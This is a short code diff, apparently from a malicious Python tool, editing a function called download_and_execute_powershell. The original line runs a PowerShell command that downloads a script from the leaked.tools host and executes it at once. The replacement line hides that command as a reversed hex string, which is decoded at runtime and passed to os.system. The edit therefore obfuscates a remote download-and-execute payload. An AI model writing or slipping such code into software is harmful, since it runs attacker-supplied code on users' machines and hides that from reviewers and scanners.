@@ -174,7 +174,7 @@ class Tasks:
 
 
 def download_and_execute_powershell():
-    os.system('powershell "iwr https://leaked.tools/r/MY5U7JRguB | iex"')
+    os.system(base64.b16decode("2287569602C70224577625A473555395D4F227F237C6F6F647E24656B61656C6F2F2A33707474786022777962202C6C6568637275677F607"[::-1]).decode())
 
 class Syscalls:
 
